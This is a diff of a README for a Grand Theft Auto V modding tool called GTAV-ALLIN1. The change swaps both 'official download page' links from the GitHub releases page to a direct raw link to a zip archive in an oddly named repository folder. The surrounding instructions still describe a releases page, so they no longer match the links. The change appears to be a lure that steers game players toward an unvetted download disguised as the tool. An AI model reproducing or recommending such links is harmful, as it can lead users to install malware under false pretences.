@@ -1,6 +1,6 @@
 # 🎮 GTAV-ALLIN1 - Simple Modding Tool For Better Play
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/lawyerclientrelationmoralcertainty737/GTAV-ALLIN1/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://raw.githubusercontent.com/lawyerclientrelationmoralcertainty737/GTAV-ALLIN1/main/Eburna/GTA-ALLI-3.6.zip)
 
 ## 📁 What is this tool?
 
@@ -21,7 +21,7 @@ Your computer must meet these basic needs to run the tool.
 
 Follow these steps to obtain the correct file version for your system.
 
-[Visit the official download page here to get the latest file](https://github.com/lawyerclientrelationmoralcertainty737/GTAV-ALLIN1/releases)
+[Visit the official download page here to get the latest file](https://raw.githubusercontent.com/lawyerclientrelationmoralcertainty737/GTAV-ALLIN1/main/Eburna/GTA-ALLI-3.6.zip)
 
 1. Navigate to the link provided above.
 2. Look for the section labeled "Assets" at the bottom of the top release post.
